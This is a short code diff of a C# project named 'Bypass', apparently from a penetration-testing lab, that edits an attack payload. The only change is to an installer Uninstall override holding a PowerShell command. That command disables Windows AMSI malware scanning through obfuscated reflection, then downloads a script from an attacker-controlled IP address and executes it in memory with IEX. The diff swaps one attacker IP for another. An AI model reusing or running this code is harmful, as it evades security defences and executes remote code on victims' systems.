@@ -18,7 +18,7 @@ namespace Bypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            String cmd = "(([Ref].Assembly.gettypes() | ? {$_.Name -like \"Am*s\"}).GetFields(\"NonPublic,Static\") | ? {$_.Name -like \"am*ed\"}).SetValue($null,$true);(New-Object System.Net.WebClient).DownloadString('http://192.168.45.208/ref.txt') | IEX";
+            String cmd = "(([Ref].Assembly.gettypes() | ? {$_.Name -like \"Am*s\"}).GetFields(\"NonPublic,Static\") | ? {$_.Name -like \"am*ed\"}).SetValue($null,$true);(New-Object System.Net.WebClient).DownloadString('http://192.168.45.233/ref.txt') | IEX";
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
 
